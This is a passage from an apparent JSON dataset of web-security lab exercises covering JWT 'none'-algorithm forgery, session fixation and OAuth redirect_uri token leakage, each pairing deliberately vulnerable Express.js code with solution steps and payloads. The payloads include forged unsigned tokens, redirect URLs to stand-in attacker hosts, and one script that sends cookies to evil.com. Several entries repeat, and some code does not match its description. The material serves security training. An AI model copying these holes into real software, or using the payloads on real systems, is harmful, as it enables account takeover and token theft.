    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { userProfile: User } type User { username: String, email: String }`); const users = { 'carlos': { username: 'carlos', email: 'carlos@example.com' } }; app.use('/graphql', (req, res, next) => { const auth = req.headers['authorization']; if (auth) { const token = auth.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid Token'); } } next(); }, graphqlHTTP(req => ({ schema: schema, rootValue: { userProfile: () => users[req.user?.username] }, graphiql: false }))); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login workflow",
    "Lab Description": "This application assigns session IDs before login using a predictable UUIDv4 generator. After login, the same session ID remains active. The attacker can set their session ID and then trick the victim into using it. When the victim logs in, the attacker gains access to their session. To solve: Hijack Carlos's session and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a GET /login request and notice the Set-Cookie: session= field uses predictable UUIDs",
      "Send a request with a custom session ID like session=123e4567-e89b-12d3-a456-426614174000 before login",
      "Send this crafted link with the same session ID to carlos (simulate using Burp Collaborator or inject via referrer)",
      "Wait for Carlos to log in through the crafted link which ties his account to attacker session",
      "Reuse the same session ID to access /my-account as carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const uuid = require('uuid'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'password123' }; app.get('/login', (req, res) => { const sid = req.cookies.session || uuid.v4(); res.cookie('session', sid); res.send('<form method=\"POST\">Username: <input name=\"username\"><br>Password: <input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=123e4567-e89b-12d3-a456-426614174000",
      "Cookie: session=deadbeef-dead-beef-dead-beefdeadbeef"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login integration",
    "Lab Description": "The application integrates with a third-party OAuth provider but does not validate the returned access token properly. Attackers can reuse tokens issued to different clients. The misconfiguration stems from missing audience (aud) validation. To solve: Use a token issued for another app to log in as carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Postman to initiate OAuth login for your own account and capture the access token returned",
      "Notice the JWT contains claims for sub, aud, and email, but the app only checks sub for identity",
      "Obtain a token from the same OAuth provider issued to a different client_id but for sub=carlos",
      "Replace your token with the forged one in the Authorization header and send a request to /auth/callback",
      "Verify access by accessing the protected /my-account endpoint and observing Carlos’s profile"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/auth/callback', (req, res) => { const token = req.query.token; try { const decoded = jwt.decode(token); req.user = decoded.sub; } catch (err) { return res.status(400).send('Invalid token'); } res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.user && users[req.user]) { res.send(`User: ${req.user}, Email: ${users[req.user].email}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJmYWtlLW90aGVyLWFwcCJ9.signature",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJtb2NrLWFwcCJ9."
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in authorization header",
    "Lab Description": "This lab's authorization system uses JWT tokens for user identity and access control. The server validates tokens based on the algorithm specified in the token header without enforcing expected signing algorithms. The application naively accepts tokens signed with the 'none' algorithm. To solve: Craft a JWT token that impersonates the 'admin' user and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login request using Burp Suite and extract the JWT from the Authorization header.",
      "2. Decode the token at jwt.io or using a script to examine the header and payload. Confirm that the server allows algorithm substitution.",
      "3. Modify the JWT header to set \"alg\": \"none\" and set the payload to {\"username\":\"admin\"}.",
      "4. Remove the signature portion entirely and resend the modified token in the Authorization header using Postman or Burp Repeater.",
      "5. Send a GET request to /admin with the forged JWT and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const users = [{ username: 'admin' }, { username: 'wiener' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, 'supersecret', { algorithms: [payload.header.alg] }); if (verified.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{ \"username\":\"admin\" }.",
      "Authorization: Bearer <unsigned-admin-token>"
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session token reuse",
    "Lab Description": "The lab's login mechanism assigns session tokens before authentication, but does not regenerate them afterward. The application uses cookies to maintain session state. An attacker can set a session ID before victim login, and it will be reused after successful authentication. To solve: Fixate Carlos's session ID and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture the GET /login request and note the Set-Cookie header issuing the session ID.",
      "2. Share this crafted session ID with the victim (Carlos) using social engineering or embedding it in a phishing page.",
      "3. After Carlos logs in, reuse the same session ID to impersonate him by replaying it in a request to /my-account.",
      "4. Use the session cookie in Burp Repeater to make an authenticated request to /my-account.",
      "5. Confirm that the session token grants access to Carlos's profile, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'secret123' }]; app.get('/login', (req, res) => { const sid = req.cookies.sid || uuid.v4(); res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"/><input name=\"password\"/><input type=\"submit\"/></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') { res.send('Sensitive info of Carlos'); } else { res.send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "GET /login with preset cookie: sid=attacker123",
      "POST /login with credentials for Carlos using sid=attacker123",
      "GET /my-account with same sid=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with token leakage via redirect_uri manipulation",
    "Lab Description": "This lab's third-party OAuth implementation fails to properly validate redirect_uri parameters. The attacker can inject a malicious endpoint to steal access tokens via a crafted URL. The application uses OAuth for logging in users. To solve: Leak Carlos's token and use it to access his profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to observe the OAuth login flow. Identify the authorization endpoint and check how redirect_uri is handled.",
      "2. Inject your controlled endpoint (e.g., attacker.com/callback) into the redirect_uri parameter to intercept the token.",
      "3. Send the crafted authorization URL to Carlos (phishing/social engineering). Wait for him to click and authorize.",
      "4. Capture the token in your server logs (access_token in query string or fragment).",
      "5. Replay an authenticated request with the stolen token to /api/profile and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123token' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id === 'trusted-client' && response_type === 'token') { const token = tokens['carlos']; const redir = `${redirect_uri}#access_token=${token}`; res.redirect(redir); } else { res.status(400).send('Invalid request'); } }); app.get('/api/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123token') { res.send('Carlos profile data'); } else { res.status(401).send('Unauthorized'); } }); app.listen(8080);",
    "payloads": [
      "https://target.com/oauth/authorize?client_id=trusted-client&redirect_uri=https://attacker.com/callback&response_type=token",
      "GET /api/profile with header Authorization: Bearer abc123token",
      "#access_token=abc123token intercepted from attacker.com logs"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm in authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management, but fails to validate the signature algorithm securely. It accepts tokens with the 'alg' set to 'none' without verifying the signature. The application blindly trusts the decoded payload. To solve: Craft a tampered JWT token impersonating the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request to /my-account while logged in with your own user.",
      "2. Extract the JWT token from the Authorization header and decode it using jwt.io or Burp Decoder.",
      "3. Modify the payload to { \"username\": \"carlos\" } and set the header to { \"alg\": \"none\" }, then remove the signature.",
      "4. Replace the Authorization header value with your modified unsigned token.",
      "5. Forward the modified request to /my-account and verify if Carlos's account data is accessible."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const user = users.find(u => u.username === decoded.payload.username); if (!user) return res.status(403).send('Access Denied'); res.send(`Account details for ${user.username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens",
    "Lab Description": "The application implements session tokens that are not regenerated upon login and are derived from predictable values such as timestamps or usernames. The attacker can fix a session identifier before login. To solve: Create a session for Carlos before he logs in, then access his account once he authenticates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate a GET /login request without credentials and note the Set-Cookie header containing a session ID.",
      "2. Send the session cookie value to Carlos via phishing or assume he's logged in using the same predictable session ID.",
      "3. Once Carlos logs in using the fixed session, reuse the same session cookie in your browser.",
      "4. Send a GET /my-account request with that session cookie.",
      "5. Observe if access is granted to Carlos's authenticated session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || 'sess-' + new Date().getTime(); res.cookie('session', sessionId); res.send('<form method=post><input name=username><input name=password></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; if (users[username] === password) { sessions[sessionId] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome ${user}, this is your account page.`); } else { res.send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=sess-1713100000000",
      "Cookie: session=sess-guest-session"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect URI trust",
    "Lab Description": "This lab simulates a misconfigured OAuth flow where the application does not properly validate the redirect URI, allowing open redirection and token leakage. Attackers can supply their own redirect URI to capture access tokens issued to another user. To solve: Exploit the OAuth flow to steal an access token for user 'carlos' and use it to access their protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth authorization request to /auth?redirect_uri=...",
      "2. Modify the redirect_uri parameter to point to your Burp Collaborator or webhook.site endpoint.",
      "3. Trick Carlos into clicking the manipulated OAuth login URL via social engineering.",
      "4. Capture the token in your endpoint logs and extract the access_token parameter.",
      "5. Send a GET request to /my-account with Authorization: Bearer <stolen_token>."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (!redirect_uri || !client_id || response_type !== 'token') return res.status(400).send('Invalid OAuth request'); const accessToken = 'token-carlos-abc123'; res.redirect(`${redirect_uri}#access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-abc123') res.send('Welcome carlos. This is your protected data.'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/auth?client_id=123&redirect_uri=https://attacker.site/capture&response_type=token",
      "Authorization: Bearer token-carlos-abc123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in session validation",
    "Lab Description": "This lab implements JWT-based authentication using the `alg` field in the token header to determine the algorithm dynamically. The application fails to properly validate this value, allowing an attacker to forge a valid token using `alg: none`. To solve: Forge a token that grants access to Carlos’s account using algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or Postman to intercept a login request and retrieve your JWT token from the Set-Cookie header.",
      "Decode the token using jwt.io and observe the algorithm in the header (e.g., HS256) and payload structure.",
      "Replace the algorithm field in the token header with `none`, and remove the signature section.",
      "Modify the payload to impersonate user `carlos`.",
      "Resend the forged JWT in the Authorization header or as a cookie and access the /my-account endpoint to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { carlos: 'admin', wiener: 'user' }; app.get('/login', (req, res) => { const { username } = req.query; if (users[username]) { const token = jwt.sign({ user: username, role: users[username] }, 'secret', { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in'); } else { res.status(403).send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0"
    ]
  },
  {
    "Lab scenario": "OAuth redirect manipulation for token leakage",
    "Lab Description": "This lab integrates third-party OAuth for login and uses the `redirect_uri` parameter to navigate users post-authentication. The application fails to validate this URI properly. To solve: Manipulate the redirect_uri to leak Carlos's OAuth token to your controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the login flow and identify the OAuth authorization request with `redirect_uri` parameter.",
      "Modify the `redirect_uri` to point to your controlled domain (e.g., https://evil.com/callback).",
      "Complete the login process using Carlos's OAuth credentials or initiate it on their behalf if tokens are URL-bound.",
      "Capture the authorization code or access token on your domain.",
      "Use the stolen token in a request to the app's /my-account endpoint to gain access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const code = req.query.code; const redirect_uri = req.query.redirect_uri; request.post('https://oauth.example.com/token', { form: { code, client_id: 'client123', client_secret: 'secret', redirect_uri } }, (err, response, body) => { const token = JSON.parse(body).access_token; res.cookie('access_token', token); res.redirect(redirect_uri); }); }); app.get('/my-account', (req, res) => { const token = req.cookies.access_token; if (token === 'admin-oauth-token') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://evil.com/callback",
      "https://evil.com?code={authCode}",
      "https://evil.com/callback?token={accessToken}"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application assigns session tokens before authentication and does not generate a new session upon successful login. This allows an attacker to fix a session ID for a victim. To solve: Set a session ID, trick Carlos into logging in, then reuse the same session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to initiate a session by accessing the login page and capture the session cookie (e.g., session=abc123).",
      "Send the session ID to the victim (Carlos) via phishing or an embedded link containing the fixed session cookie.",
      "Wait for Carlos to log in while using the session ID you set.",
      "Once logged in, reuse the same session cookie to access the /my-account page as Carlos.",
      "Verify access to Carlos's account and confirm exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weak', resave: true, saveUninitialized: true })); const users = { carlos: 'securepass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.send('Logged in'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(5000);",
    "payloads": [
      "session=fixatedSession123",
      "Set-Cookie: session=fixatedSession123",
      "GET /my-account HTTP/1.1\nCookie: session=fixatedSession123"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass in stateless session handling",
    "Lab Description": "This lab demonstrates a JWT validation flaw caused by the server not verifying the token's algorithm. The application accepts JWTs as bearer tokens to manage authentication. However, it does not verify whether the signature algorithm is secure. To solve: Modify and forge a JWT token that grants access to Carlos’s protected account page without knowing the original secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or Burp Suite to capture a legitimate JWT from your account login.",
      "2. Decode the JWT using jwt.io or any JWT decoder and note the header and payload structure.",
      "3. Modify the 'alg' field in the JWT header from 'HS256' to 'none'. Remove the signature.",
      "4. In the payload, change 'username' to 'carlos' and re-encode the token without a signature.",
      "5. Use the tampered JWT as a Bearer token in the Authorization header to access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { carlos: { role: 'admin' }, wiener: { role: 'user' } }; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); res.send(`Welcome ${decoded.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration via open redirect abuse",
    "Lab Description": "The application integrates with a third-party OAuth provider for authentication. Due to poor redirect URI validation, it is vulnerable to open redirect abuse, allowing attackers to intercept authorization codes. To solve: Exploit the misconfigured redirect URI to capture Carlos's OAuth token and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to initiate OAuth login flow and intercept the GET request to /auth/redirect?next=[URL].",
      "2. Modify the next parameter to redirect to your malicious server (e.g., http://evil.com/callback).",
      "3. Host a listener on your server to capture the authorization code sent from the provider.",
      "4. Use the captured code with curl or Postman to manually redeem the token.",
      "5. Use the token in the Authorization header to impersonate Carlos and access /account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/redirect', (req, res) => { const next = req.query.next || '/home'; res.redirect(`https://oauth-provider.com/auth?client_id=123&redirect_uri=${next}`); }); app.get('/callback', (req, res) => { const { code } = req.query; res.send('OAuth code received: ' + code); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://target.com/auth/redirect?next=http://evil.com/callback",
      "https://target.com/auth/redirect?next=https://evil.com/oauth/code",
      "https://target.com/auth/redirect?next=data:text/html,<script>location='http://evil.com?c='+document.cookie</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens",
    "Lab Description": "This lab uses predictable session tokens vulnerable to fixation. The server does not regenerate session identifiers upon authentication, allowing an attacker to set a known token and trick a victim into using it. To solve: Set a session token, trick Carlos into logging in with it, then reuse the token to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or browser dev tools to inspect the cookie during unauthenticated browsing. Note the token format.",
      "2. Generate a custom session token manually using the same predictable pattern (e.g., static prefix + timestamp).",
      "3. Set this token in your browser cookies or with Postman and send Carlos a phishing link using this session.",
      "4. After Carlos logs in via the phishing link, reuse the same session ID in a new request to /dashboard.",
      "5. Confirm access to Carlos’s session by verifying his username or settings page content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'carlospass', wiener: 'wienerpass' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; if (users[username] === password) { const sessionId = req.cookies.session || `sess_${Date.now()}`; sessions[sessionId] = username; res.cookie('session', sessionId); res.send('Login successful'); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Dashboard for ${user}`); } else { res.send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "sess_1710000000000",
      "sess_1701234567890",
      "sess_1699999999999"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof using 'none' algorithm",
    "Lab Description": "This lab is vulnerable to JWT tampering due to improper validation of the token algorithm field. The application accepts tokens signed using the 'none' algorithm without verifying their authenticity. To solve: forge a token that grants administrative access to Carlos’s account without knowing the signing secret.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT after a valid login and decode it using jwt.io.",
      "Observe the 'alg' field in the header; confirm it's set to 'HS256'. Replace this with 'none'.",
      "Remove the signature segment of the token, keeping only the base64-encoded header and payload.",
      "Modify the payload to change the username field to 'carlos' and set admin=true.",
      "Send the modified token in the Authorization header using Postman and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, admin: false }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.username === 'carlos' && payload.admin) { return res.send('Welcome Carlos - Admin Access'); } res.status(403).send('Forbidden'); } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsImFkbWluIjp0cnVlfQ.",
      "Authorization: Bearer [token]",
      "{ \"alg\": \"none\" } header + { \"username\": \"carlos\", \"admin\": true } payload"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect misconfiguration",
    "Lab Description": "The application uses a third-party OAuth provider for login, but does not properly validate redirect URIs. An attacker can exploit this to capture tokens or impersonate a user. To solve: manipulate the redirect_uri parameter to steal Carlos’s token and access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate an OAuth login flow and capture the GET request to /oauth/authorize.",
      "Modify the redirect_uri parameter to an attacker-controlled domain that logs the access token.",
      "Send the modified URL to Carlos (social engineering assumed).",
      "Use captured token from the attacker domain and attach it in an Authorization: Bearer header.",
      "Access /my-account as Carlos and verify token grants access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('querystring'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const tokenRes = await axios.post('https://oauth-provider.com/token', qs.stringify({ code, redirect_uri }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }); const accessToken = tokenRes.data.access_token; res.redirect(`${redirect_uri}?token=${accessToken}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token-123') { return res.send('Welcome Carlos!'); } res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/oauth/callback?code=abc&redirect_uri=https://attacker.com/capture",
      "Authorization: Bearer carlos-token-123",
      "https://attacker.com/capture?token=carlos-token-123"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-set cookie",
    "Lab Description": "The application fails to regenerate the session ID after authentication. An attacker can set a session ID for the victim, then trick them into logging in with it. This allows session hijacking. To solve: set a session cookie for Carlos, wait for login, then reuse it to access the account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send a GET request with a custom session ID: Cookie: session=attack-session.",
      "Trick Carlos into clicking a crafted login link with the session cookie preset (e.g., via email).",
      "Carlos logs in, binding his account to 'attack-session'.",
      "Replay the session by reusing 'attack-session' as the cookie value.",
      "Access /my-account and confirm session fixation success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'supersecure' }; app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] === 'carlos') { return res.send('Welcome back Carlos'); } res.status(403).send('Access Denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: session=attack-session",
      "POST /login with session=attack-session and Carlos credentials",
      "GET /my-account with Cookie: session=attack-session"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in Authorization Header",
    "Lab Description": "This lab has an authentication mechanism based on JWTs which are stored and verified insecurely. The application decodes the JWT but fails to validate its signature. This allows a user to modify the token payload and gain unauthorized access. To solve: Tamper with a JWT to escalate privileges and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a request containing the JWT using Burp Suite and inspect the Authorization header.",
      "Decode the JWT at jwt.io and confirm that the signature is either 'none' or not validated server-side.",
      "Modify the payload to set \"role\": \"admin\" and set the alg header to \"none\".",
      "Remove the signature entirely and re-encode the header and payload using base64url.",
      "Replace the original token in the Authorization header and send a GET request to /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', role: 'user' }]; app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome to the admin panel'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Tampering Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in Cookie",
    "Lab Description": "This lab's session management is vulnerable due to the use of predictable session identifiers that are not regenerated after login. The application uses static session tokens which remain valid after authentication, allowing an attacker to fix a session ID for the victim. To solve: Set a known session ID, trick the victim into logging in, then hijack the session and access the account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GET request to initiate a session and capture the Set-Cookie header using Burp Suite.",
      "Manually set a known session ID (e.g., session=attacker123) using Postman or Burp.",
      "Send the crafted link with the known session ID to the victim (simulated in lab setup).",
      "After the victim logs in, reuse the same session ID in your browser.",
      "Send a GET /account request with the known cookie to access the victim's account."
    ],
    "Vulnerability name": "Authentication",
